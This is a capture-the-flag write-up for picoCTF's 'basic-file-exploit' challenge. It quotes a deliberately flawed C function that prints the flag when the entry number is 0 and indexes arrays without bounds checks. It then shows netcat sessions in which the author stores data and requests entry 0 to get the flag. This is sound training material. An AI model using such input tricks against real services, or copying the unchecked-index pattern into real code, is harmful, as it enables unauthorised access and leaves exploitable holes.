# basic-file-exploit

### Description

The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!

### Resources

- nc saturn.picoctf.net 49698
- program-redacted.c

### Solution

Step 1: Open up program-redacted.c in text editor

Step 2: Use <kbd>CTRL+f</kbd> to find where the flag variable is being used

Step 3: Notice the data_read function

```c
static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, '\0', 100);
  
  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}
```

The function works using the following logic to give the flag:
1. Enter the entry number of the data you would like to read.
2. Convert the entry number to a long value with given base 10.
3. If the converted number is equal to zero, then output the flag.

Step 4: Use the endpoint to try and get the flag

```console
sam@ubuntu:~$ nc saturn.picoctf.net 49698
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
2
2
No data yet
Timed out waiting for user input. Press Ctrl-C to disconnect
Goodbye!
```

Using the endpoint to try and access the second option resulted in an error response.

It was necessary to use the first option and enter data into the database before I could access this option. 

Step 5: Use the endpoint again to try and get the flag

```console
sam@ubuntu:~$ nc saturn.picoctf.net 49698
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
hello
hello
Please enter the length of your data:
5
5
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of you data:
0
0
```

Flagtime :tada: